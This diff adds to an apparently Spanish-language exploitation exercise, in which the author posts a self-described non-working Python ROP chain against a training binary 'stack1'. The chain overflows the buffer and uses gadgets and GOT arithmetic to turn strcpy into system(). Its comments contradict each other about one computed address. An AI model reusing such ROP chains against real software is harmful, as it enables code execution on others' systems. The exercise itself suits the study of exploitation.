@@ -297,4 +297,70 @@ $4 = {<text gnu-indirect-function variable, no debug info>} 0xb7e81580 <strcpy>
 gdb-peda$ p/x 0xb7e46b30-0xb7e81580
 $5 = 0xfffc55b0
 
+readelf -S stack1 | grep "\.data"
+  [24] .data             PROGBITS        08049720 000720 000008 00  WA  0   0  4
+
+
+Este sería mi script, que no funciona:
+
+#!/usr/bin/python
+
+
+from struct import pack
+
+
+junk = "A" * 80  # 80 bytes
+
+## ROP gadgets ##
+
+gadget1 = pack('<I', 0x8048545) # (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
+gadget2 = pack('<I', 0x804842b) # (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
+gadget3 = pack('<I', 0x8048432) # (3) pop ebx ; pop ebp ;;
+gadget4 = pack('<I', 0x804856e) # (4) add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
+gadget5 = pack('<I', 0x804845f) # (5) call eax ; leave ;;
+
+
+# OPERACIONES CONDICIONADAS POR LOS GADGETS
+
+
+padding = 0xcafedeef
+offset = 0xfffc55b0 - 0x8			# 0xfffc55a8
+data = (0x08049720-0x5d5b04c4) & 0xFFFFFFFF 	# 0xaaa9925c
+strcpy_got = (0x08049710+0xb8a0008)            	# 0x138E9718 strcpy@GOT + 0xb8a0008 for the gadget (4)
+gnu_string = 0x8048154                          # "GNU\x00" from note.gnu.build-id
+
+## PAYLOAD ##
+
+# Primero tenemos que encontra una manera de guardar el offset en una posicion de memoria que tenga permisos de escritura
+
+rop = gadget1                   # (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
+rop += pack('<I', data)		# direccion donde se puede guardar datos readelf -S stack1 | grep "\.data" (0x08049720) --> pop ebx | A esta direccion 0x08049720 hay que restarle el valor de 0x5d5b04c4, ya que luego vamos a usar la instruccion "add [ebx+0x5d5b04c4] eax" en el gadget2. Valor=(0x08049720-0x5d5b04c4) & 0xFFFFFFFF = 0xaaa9925c
+rop += pack('<I', padding)	# otro valor cualquiera --> pop esi
+rop += pack('<I', offset)	# valor del offset (&system-&strcpy)(0xfffc55b0) --> pop edi | A este valor hay que restarle 0x8 condicionado por la instruccion "add al 0x8" del gadget2. Valor = 0xfffc55b0 - 0x8 = 0xfffc55a8
+rop += pack('<I', padding)	# otro valor cualquiera --> pop ebp
+rop += gadget2			# (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
+
+# Ahora hay que poner la direccion de strcpy en un registro, para luego sumarle el offset y llegar a system ;-)
+
+rop += gadget3                 	# (3) pop ebx ; pop ebp ;;
+rop += pack('<I', strcpy_got)   # direccion de strcpy (0xb7e81580) | Hay que sumarle 0xb8a0008 condicionado por la instruccion "add eax [ebx-0xb8a0008]" del gadget4. Valor= 0xb7e81580 + 0xb8a0008 = 0xC3721588
+rop += pack('<I', padding)	# otro valor cualquiera --> pop ebp
+rop += gadget4                  # (4) add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;; EAX = (OFFSET system-strcpy) + strcpy = SYSTEM ;D
+rop += pack('<I', padding)	# otro valor cualquiera --> add esp 0x4
+rop += pack('<I', padding)	# otro valor cualquiera --> pop ebx
+rop += pack('<I', padding)	# otro valor cualquiera --> pop ebp
+
+
+# Por ultimo llamamos a system
+
+rop += gadget5                   # call eax ; leave ;;
+rop += pack('<I', gnu_string)    # "GNU" string
+
+
+payload = junk + rop
+ 
+print payload
+
+
+
 
